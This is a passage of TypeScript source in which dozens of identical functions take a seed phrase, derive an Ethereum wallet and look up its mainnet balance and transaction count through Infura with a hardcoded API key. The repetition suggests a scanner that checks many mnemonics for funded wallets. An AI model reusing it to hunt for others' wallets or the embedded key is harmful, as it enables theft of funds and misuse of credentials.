async function s119(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s120(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s121(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s122(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s123(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s124(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s125(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s126(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s127(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s128(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s129(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s130(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s131(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s132(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s133(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s134(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s135(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s136(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s137(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s138(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s139(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s140(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s141(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s142(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s143(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s144(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s145(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s146(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s147(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s148(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s149(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s150(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s151(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s152(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s153(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s154(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s155(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s156(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s157(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s158(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s159(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s160(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s161(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s162(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s163(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s164(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s165(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s166(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s167(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s168(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s169(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s170(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s171(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s172(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s173(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s174(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s175(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s176(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s177(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s178(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;

  }
}
async function s179(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s180(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
